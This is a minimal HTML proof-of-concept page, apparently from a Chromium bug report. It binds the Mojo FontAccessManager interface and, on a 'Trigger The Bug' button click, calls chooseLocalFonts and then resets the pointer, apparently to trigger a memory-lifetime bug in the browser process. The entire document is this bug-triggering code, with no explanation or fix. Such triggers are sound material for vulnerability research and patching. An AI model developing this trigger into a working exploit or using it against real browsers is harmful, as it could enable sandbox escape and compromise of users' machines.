<!DOCTYPE html>
<html>
<head>
    <script src="./mojo_bindings.js"></script>
    <script src="./third_party/blink/public/mojom/font_access/font_access.mojom.js"></script>
    <button id="triggerButton">Trigger The Bug</button>
<script>
    var fam_ptr = new blink.mojom.FontAccessManagerPtr();
    Mojo.bindInterface(blink.mojom.FontAccessManager.name,mojo.makeRequest(fam_ptr).handle);

    triggerButton = document.querySelector('#triggerButton');
    triggerButton.addEventListener('click', async event => {
        fam_ptr.chooseLocalFonts([]);
        fam_ptr.ptr.reset();
    }); 
</script>
</head>
</html>
